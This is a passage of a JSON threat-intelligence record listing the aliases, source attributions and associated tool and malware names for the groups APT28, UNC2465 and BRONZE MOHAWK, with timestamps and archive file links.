            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e9f7f836-b77f-4f95-aa02-9e99d32faf1d",
            "created_at": "2024-12-21T02:00:02.857057Z",
            "updated_at": "2025-03-27T02:00:03.472472Z",
            "deleted_at": null,
            "main_name": "UNC2465",
            "aliases": [],
            "source_name": "MISPGALAXY:UNC2465",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "83025f5e-302e-46b0-baf6-650a4d313dfc",
            "created_at": "2024-05-01T02:03:07.971863Z",
            "updated_at": "2025-03-27T02:05:17.278721Z",
            "deleted_at": null,
            "main_name": "BRONZE MOHAWK",
            "aliases": [
                "Flaccid Rose ",
                "GADOLINIUM ",
                "Kryptonite Panda ",
                "Leviathan ",
                "Nanhaishu ",
                "Pickleworm ",
                "Temp.Jumper ",
                "Temp.Periscope ",
                "APT40 "
            ],
            "source_name": "Secureworks:BRONZE MOHAWK",
            "tools": [
                " BlackCoffee",
                " China Chopper",
                " Cobalt Strike",
                " Derusbi",
                " Derusbi Trojan",
                " FUSIONBLAZE",
                " GreenCrash",
                " HOMEFRY",
                " MURKYTOP",
                " Metasploit",
                " Metasploit / Meterpreter",
                " Nanhaishu",
                " Orz",
                " ScanBox",
                " SeDll",
                "AIRBREAK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535555,
    "ts_updated_at": 1743041836,
    "ts_creation_date": 1658167635,
    "ts_modification_date": 1658167635,
    "files": {
        "pdf": "https://archive.orkl.eu/c04101c033add456e94a22ed3e7d943a6a09f0ac.pdf",
        "text": "https://archive.orkl.eu/c04101c033add456e94a22ed3e7d943a6a09f0ac.txt",
        "img": "https://archive.orkl.eu/c04101c033add456e94a22ed3e7d943a6a09f0ac.jpg"
    }
}